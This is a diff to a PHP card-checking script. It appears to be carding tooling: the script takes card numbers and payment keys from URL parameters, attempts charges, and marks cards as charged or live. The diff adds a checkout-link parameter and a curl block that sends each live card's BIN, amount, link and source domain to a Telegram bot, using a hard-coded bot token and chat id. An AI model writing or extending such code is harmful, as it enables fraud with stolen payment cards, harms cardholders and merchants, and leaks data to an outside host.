@@ -51,6 +51,7 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 $pklive = $_GET['pklive'];
 $cslive = $_GET['cslive'];
+$colink = $_GET['colink'];
 $xamount = $_GET['xamount'];
 $xemail = $_GET['xemail'];
 
@@ -308,7 +309,7 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
 #############SUCCEEDED SUCCESS
  if (strpos($result1, '"status": "succeeded"')) {
     echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'>[ receipt here ]</a> -Alice Schuberg</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=Successfull Checkout%0A%0A%0ABIN: '.$lista.'%0AURL: '.$success.'%0AAmount: '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
+        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=Successfull Checkout%0A%0ABIN: '.$lista.'%0AURL: '.$success.'%0AAmount: '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -336,7 +337,12 @@ elseif($tos == "required") {
 }
 if (strpos($curl0, '"insufficient_funds"')) {
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
-        $insuf_sendtobot;
+        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0ACheckout link:%0A'.$colink.'%0AChecked from:%0A'.$domain.'';
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
     exit();
 }
 
@@ -371,7 +377,7 @@ elseif($tos == "required") {
 }
 if (strpos($curl1, '"insufficient_funds"')) {
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
+        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0ACheckout link:%0A'.$colink.'%0AChecked from:%0A'.$domain.'';
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -407,7 +413,7 @@ elseif($tos == "required") {
 }
 if (strpos($result1, '"insufficient_funds"')) {
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
+        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0ACheckout link:%0A'.$colink.'%0AChecked from:%0A'.$domain.'';
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
